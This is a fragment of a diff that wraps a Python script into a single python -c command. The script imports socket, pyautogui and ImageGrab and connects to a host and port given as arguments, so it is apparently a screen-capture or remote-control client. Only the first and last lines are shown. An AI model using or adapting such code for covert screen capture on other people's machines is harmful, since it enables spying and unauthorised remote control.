@@ -1,4 +1,4 @@
-import socket
+python -c 'import socket
 import pyautogui
 from PIL import ImageGrab
 import io
@@ -82,4 +82,4 @@ if __name__ == "__main__":
     host = sys.argv[1]
     port = int(sys.argv[2])
 
-    main(host, port)
+    main(host, port)'
